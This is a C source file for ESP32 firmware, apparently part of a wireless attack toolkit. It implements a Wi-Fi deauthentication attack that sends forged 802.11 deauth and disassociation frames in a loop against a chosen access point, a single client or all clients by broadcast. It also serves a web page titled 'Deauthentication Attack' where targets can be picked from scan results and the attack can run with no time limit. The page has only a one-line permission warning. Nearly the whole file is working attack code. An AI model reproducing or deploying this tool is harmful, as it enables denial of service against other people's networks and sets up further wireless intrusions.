#include "deauth_attack.h"
#include "wifi_scan.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_system.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "main.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "DEAUTH";

static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
};

static const uint8_t disassoc_frame_default[] = {
    0xa0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
};

typedef struct {
    uint8_t ap_mac[6];
    uint8_t client_mac[6];
    uint8_t channel;
    uint32_t duration_sec;
    bool broadcast;
    uint32_t packets_sent;
    uint32_t start_time;
} deauth_config_t;

static TaskHandle_t deauth_task_handle = NULL;
static bool attack_running = false;
static deauth_config_t attack_config = {0};
static SemaphoreHandle_t config_mutex = NULL;

static void send_deauth_frame(const uint8_t *src, const uint8_t *dst, const uint8_t *bssid, bool disassoc) {
    uint8_t frame[26];
    
    if (disassoc) {
        memcpy(frame, disassoc_frame_default, sizeof(disassoc_frame_default));
    } else {
        memcpy(frame, deauth_frame_default, sizeof(deauth_frame_default));
    }
    
    memcpy(&frame[4], dst, 6);
    memcpy(&frame[10], src, 6);
    memcpy(&frame[16], bssid, 6);
    
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
}

static void deauth_task(void *pvParameters) {
    ESP_LOGI(TAG, "Deauth attack started");
    
    uint8_t ap_mac[6], client_mac[6], channel;
    uint32_t duration;
    bool broadcast;
    
    xSemaphoreTake(config_mutex, portMAX_DELAY);
    memcpy(ap_mac, attack_config.ap_mac, 6);
    memcpy(client_mac, attack_config.client_mac, 6);
    channel = attack_config.channel;
    duration = attack_config.duration_sec;
    broadcast = attack_config.broadcast;
    attack_config.start_time = xTaskGetTickCount() / 1000;
    xSemaphoreGive(config_mutex);
    
    // DON'T change WiFi mode - stay in APSTA
    // Only set channel and enable promiscuous WITHOUT switching modes
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(100));
    
    uint32_t start = xTaskGetTickCount() / 1000;
    
    while (attack_running) {
        uint32_t elapsed = (xTaskGetTickCount() / 1000) - start;
        if (duration > 0 && elapsed >= duration) {
            ESP_LOGI(TAG, "Attack duration reached, stopping");
            break;
        }
        
        if (broadcast) {
            // Broadcast deauth from AP to all
            send_deauth_frame(ap_mac, (uint8_t *)"\xff\xff\xff\xff\xff\xff", ap_mac, false);
            vTaskDelay(pdMS_TO_TICKS(5));
            send_deauth_frame(ap_mac, (uint8_t *)"\xff\xff\xff\xff\xff\xff", ap_mac, true);
        } else {
            // Targeted: AP -> Client
            send_deauth_frame(ap_mac, client_mac, ap_mac, false);
            vTaskDelay(pdMS_TO_TICKS(5));
            send_deauth_frame(ap_mac, client_mac, ap_mac, true);
            vTaskDelay(pdMS_TO_TICKS(5));
            
            // Client -> AP
            send_deauth_frame(client_mac, ap_mac, ap_mac, false);
            vTaskDelay(pdMS_TO_TICKS(5));
            send_deauth_frame(client_mac, ap_mac, ap_mac, true);
        }
        
        xSemaphoreTake(config_mutex, portMAX_DELAY);
        attack_config.packets_sent += (broadcast ? 2 : 4);
        xSemaphoreGive(config_mutex);
        
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    // DON'T disable promiscuous - leave it as is
    attack_running = false;
    ESP_LOGI(TAG, "Deauth attack stopped. Packets sent: %lu", attack_config.packets_sent);
    
    deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

void deauth_attack_start(const uint8_t *ap_mac, const uint8_t *client_mac, uint8_t channel, uint32_t duration_sec) {
    if (attack_running) {
        ESP_LOGW(TAG, "Attack already running");
        return;
    }
    
    if (!config_mutex) {
        config_mutex = xSemaphoreCreateMutex();
    }
    
    xSemaphoreTake(config_mutex, portMAX_DELAY);
    
    memcpy(attack_config.ap_mac, ap_mac, 6);
    attack_config.channel = channel;
    attack_config.duration_sec = duration_sec;
    attack_config.packets_sent = 0;
    
    if (client_mac) {
        memcpy(attack_config.client_mac, client_mac, 6);
        attack_config.broadcast = false;
    } else {
        memset(attack_config.client_mac, 0xFF, 6);
        attack_config.broadcast = true;
    }
    
    xSemaphoreGive(config_mutex);
    
    attack_running = true;
    xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
}

void deauth_attack_stop(void) {
    if (!attack_running) return;
    
    attack_running = false;
    
    while (deauth_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    ESP_LOGI(TAG, "Deauth attack terminated");
}

bool is_deauth_running(void) {
    return attack_running;
}

void deauth_get_status(deauth_status_t *status) {
    if (!config_mutex || !status) return;
    
    xSemaphoreTake(config_mutex, portMAX_DELAY);
    memcpy(status->ap_mac, attack_config.ap_mac, 6);
    memcpy(status->client_mac, attack_config.client_mac, 6);
    status->channel = attack_config.channel;
    status->packets_sent = attack_config.packets_sent;
    status->broadcast = attack_config.broadcast;
    status->elapsed_sec = (xTaskGetTickCount() / 1000) - attack_config.start_time;
    status->duration_sec = attack_config.duration_sec;
    xSemaphoreGive(config_mutex);
}

esp_err_t wifi_deauth_handler(httpd_req_t *req) {
    // DON'T stop tools on page load - only when starting a new attack
    
    char query[512];
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        if (strstr(query, "stop=1")) {
            deauth_attack_stop();
            
            const char *resp = "<!DOCTYPE html><html><head>"
                "<meta http-equiv='refresh' content='1;url=/wifi_deauth'>"
                "<style>body{background:#0a0f1c;color:#f5c542;font-family:sans-serif;text-align:center;padding:50px;}</style>"
                "</head><body><h1>✅ Attack Stopped</h1><p>Redirecting...</p></body></html>";
            
            httpd_resp_set_type(req, "text/html");
            httpd_resp_send(req, resp, strlen(resp));
            return ESP_OK;
        }
        
        if (strstr(query, "start=1")) {
            uint8_t ap_mac[6] = {0};
            uint8_t client_mac[6] = {0};
            uint8_t channel = 1;
            uint32_t duration = 0;
            bool has_client = false;
            
            char *ap_param = strstr(query, "ap=");
            char *client_param = strstr(query, "client=");
            char *ch_param = strstr(query, "channel=");
            char *dur_param = strstr(query, "duration=");
            
            if (ap_param) {
                sscanf(ap_param + 3, "%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx",
                    &ap_mac[0], &ap_mac[1], &ap_mac[2], &ap_mac[3], &ap_mac[4], &ap_mac[5]);
            }
            
            if (client_param) {
                if (sscanf(client_param + 7, "%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx",
                    &client_mac[0], &client_mac[1], &client_mac[2], &client_mac[3], &client_mac[4], &client_mac[5]) == 6) {
                    has_client = true;
                }
            }
            
            if (ch_param) channel = atoi(ch_param + 8);
            if (dur_param) duration = atoi(dur_param + 9);
            
            deauth_attack_start(ap_mac, has_client ? client_mac : NULL, channel, duration);
            
            const char *resp = "<!DOCTYPE html><html><head>"
                "<meta http-equiv='refresh' content='1;url=/wifi_deauth'>"
                "<style>body{background:#0a0f1c;color:#f5c542;font-family:sans-serif;text-align:center;padding:50px;}</style>"
                "</head><body><h1>⚡ Attack Started</h1><p>Redirecting...</p></body></html>";
            
            httpd_resp_set_type(req, "text/html");
            httpd_resp_send(req, resp, strlen(resp));
            return ESP_OK;
        }
    }
    
    // Generate interface
    bool is_running = is_deauth_running();
    deauth_status_t status = {0};
    if (is_running) {
        deauth_get_status(&status);
    }
    
    // Get scan results for AP/client selection
    ap_with_clients_t scan_results[20];
    int scan_count = wifi_scan_get_results(scan_results, 20);
    
    char *page = malloc(32768);
    if (!page) {
        const char *err = "<html><body>Memory Error</body></html>";
        httpd_resp_send(req, err, strlen(err));
        return ESP_FAIL;
    }
    
    const char *auto_refresh = is_running ? "<meta http-equiv='refresh' content='2'>" : "";
    
    int offset = 0;
    offset += snprintf(page + offset, 32768 - offset,
        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>%s"
        "<title>Deauth Attack</title><style>"
        "body{background:#0a0f1c;color:#f5c542;font-family:sans-serif;margin:0;padding:20px;}"
        "h1{text-align:center;}h2{color:#f5c542;border-bottom:2px solid #f5c542;padding-bottom:5px;}"
        ".container{max-width:900px;margin:0 auto;}"
        ".status{padding:15px;margin:20px 0;border-radius:8px;text-align:center;font-weight:bold;}"
        ".status.running{background:#ff4444;color:white;}"
        ".status.stopped{background:#44ff44;color:#0a0f1c;}"
        ".control{background:#1a1f2c;padding:20px;border-radius:8px;margin:20px 0;}"
        "label{display:block;margin:10px 0 5px;font-weight:bold;}"
        "input,select{width:100%%;padding:10px;border-radius:5px;border:2px solid #f5c542;"
        "background:#0a0f1c;color:#f5c542;margin-bottom:15px;box-sizing:border-box;}"
        ".btn{display:inline-block;padding:12px 20px;margin:10px 5px;background:#f5c542;"
        "color:#0a0f1c;text-decoration:none;font-weight:bold;border-radius:8px;border:none;"
        "cursor:pointer;}.btn:hover{background:#d4a017;}.btn.danger{background:#ff4444;color:white;}"
        ".btn.full{width:100%%;box-sizing:border-box;}"
        "table{width:100%%;border-collapse:collapse;margin:10px 0;}"
        "th,td{padding:8px;border:1px solid #f5c542;text-align:left;font-size:0.9em;}"
        "th{background:#1a1f2c;color:#f5c542;}"
        "tr:hover{background:#1a1f2c;cursor:pointer;}"
        ".info{background:#1a1f2c;padding:15px;border-radius:8px;margin:20px 0;border-left:4px solid #f5c542;}"
        ".stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin:20px 0;}"
        ".stat-box{background:#1a1f2c;padding:15px;border-radius:8px;text-align:center;}"
        ".stat-value{font-size:2em;font-weight:bold;color:#f5c542;}"
        ".stat-label{font-size:0.9em;color:#FFC107;margin-top:5px;}"
        "</style>"
        "<script>"
        "function selectAP(bssid,ch){document.getElementById('ap').value=bssid;document.getElementById('channel').value=ch;}"
        "function selectClient(mac){document.getElementById('client').value=mac;}"
        "</script>"
        "</head><body><div class='container'>"
        "<h1>🔴 Deauthentication Attack</h1>",
        auto_refresh);
    
    if (is_running) {
        offset += snprintf(page + offset, 32768 - offset,
            "<div class='status running'>🔴 ATTACK ACTIVE</div>"
            "<div class='stats'>"
            "<div class='stat-box'><div class='stat-value'>%lu</div><div class='stat-label'>Packets Sent</div></div>"
            "<div class='stat-box'><div class='stat-value'>%lu</div><div class='stat-label'>Seconds Elapsed</div></div>"
            "<div class='stat-box'><div class='stat-value'>CH %d</div><div class='stat-label'>Channel</div></div>"
            "</div>"
            "<div class='info'><strong>Target:</strong> %02X:%02X:%02X:%02X:%02X:%02X %s %02X:%02X:%02X:%02X:%02X:%02X</div>"
            "<div class='control'><a href='/wifi_deauth?stop=1' class='btn danger full'>⏹ Stop Attack</a></div>",
            status.packets_sent, status.elapsed_sec, status.channel,
            status.ap_mac[0], status.ap_mac[1], status.ap_mac[2], status.ap_mac[3], status.ap_mac[4], status.ap_mac[5],
            status.broadcast ? "(broadcast)" : "→",
            status.client_mac[0], status.client_mac[1], status.client_mac[2], status.client_mac[3], status.client_mac[4], status.client_mac[5]);
    } else {
        offset += snprintf(page + offset, 32768 - offset,
            "<div class='status stopped'>🟢 Ready</div>"
            "<div class='info'><strong>⚠️ Warning:</strong> Deauth attacks disconnect devices from WiFi. "
            "Use only on networks you own or have permission to test.</div>"
            "<div class='control'><h2>Launch Attack</h2>"
            "<form action='/wifi_deauth' method='get'>"
            "<label>Target AP (BSSID):</label>"
            "<input type='text' id='ap' name='ap' placeholder='AABBCCDDEEFF' pattern='[A-Fa-f0-9]{12}' required>"
            "<label>Target Client (leave empty for broadcast):</label>"
            "<input type='text' id='client' name='client' placeholder='112233445566 or leave empty' pattern='[A-Fa-f0-9]{12}'>"
            "<label>Channel:</label>"
            "<select id='channel' name='channel'>");
        
        for (int i = 1; i <= 13; i++) {
            offset += snprintf(page + offset, 32768 - offset,
                "<option value='%d'%s>Channel %d</option>",
                i, i == 6 ? " selected" : "", i);
        }
        
        offset += snprintf(page + offset, 32768 - offset,
            "</select><label>Duration (0 = infinite):</label>"
            "<select name='duration'>"
            "<option value='0'>Infinite (manual stop)</option>"
            "<option value='30'>30 seconds</option>"
            "<option value='60' selected>60 seconds</option>"
            "<option value='120'>2 minutes</option>"
            "<option value='300'>5 minutes</option>"
            "<option value='600'>10 minutes</option>"
            "</select>"
            "<input type='hidden' name='start' value='1'>"
            "<button type='submit' class='btn full'>▶ Start Attack</button>"
            "</form></div>");
        
        if (scan_count > 0) {
            offset += snprintf(page + offset, 32768 - offset,
                "<h2>📡 Available Networks (click to select)</h2>"
                "<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>RSSI</th><th>Clients</th></tr>");
            
            for (int i = 0; i < scan_count && offset < 31000; i++) {
                char bssid[13];
                snprintf(bssid, sizeof(bssid), "%02X%02X%02X%02X%02X%02X",
                    scan_results[i].ap.bssid[0], scan_results[i].ap.bssid[1], scan_results[i].ap.bssid[2],
                    scan_results[i].ap.bssid[3], scan_results[i].ap.bssid[4], scan_results[i].ap.bssid[5]);
                
                offset += snprintf(page + offset, 32768 - offset,
                    "<tr onclick=\"selectAP('%s',%d)\"><td>%s</td><td>%c%c:%c%c:%c%c:%c%c:%c%c:%c%c</td><td>%d</td><td>%d</td><td>%d</td></tr>",
                    bssid, scan_results[i].ap.primary,
                    strlen((char *)scan_results[i].ap.ssid) > 0 ? (char *)scan_results[i].ap.ssid : "<hidden>",
                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],bssid[6],bssid[7],bssid[8],bssid[9],bssid[10],bssid[11],
                    scan_results[i].ap.primary, scan_results[i].ap.rssi, scan_results[i].client_count);
                
                if (scan_results[i].client_count > 0) {
                    for (int j = 0; j < scan_results[i].client_count && offset < 31000; j++) {
                        char cli_mac[13];
                        snprintf(cli_mac, sizeof(cli_mac), "%02X%02X%02X%02X%02X%02X",
                            scan_results[i].clients[j].mac[0], scan_results[i].clients[j].mac[1],
                            scan_results[i].clients[j].mac[2], scan_results[i].clients[j].mac[3],
                            scan_results[i].clients[j].mac[4], scan_results[i].clients[j].mac[5]);
                        
                        offset += snprintf(page + offset, 32768 - offset,
                            "<tr onclick=\"selectClient('%s')\" style='background:#111;'><td colspan='2'>  📱 Client: %c%c:%c%c:%c%c:%c%c:%c%c:%c%c</td><td colspan='3'>%d dBm</td></tr>",
                            cli_mac,
                            cli_mac[0],cli_mac[1],cli_mac[2],cli_mac[3],cli_mac[4],cli_mac[5],
                            cli_mac[6],cli_mac[7],cli_mac[8],cli_mac[9],cli_mac[10],cli_mac[11],
                            scan_results[i].clients[j].rssi);
                    }
                }
            }
            offset += snprintf(page + offset, 32768 - offset, "</table>");
        } else {
            offset += snprintf(page + offset, 32768 - offset,
                "<div class='info'>⚠️ No scan results available. <a href='/scan?deep=1' style='color:#f5c542;'>Run a deep scan</a> first to see networks and clients.</div>");
        }
    }
    
    offset += snprintf(page + offset, 32768 - offset,
        "<div style='text-align:center;margin-top:30px;'>"
        "<a href='/' class='btn'>⬅ Back to Main Menu</a></div>"
        "</div></body></html>");
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, page, strlen(page));
    free(page);
    
    return ESP_OK;
}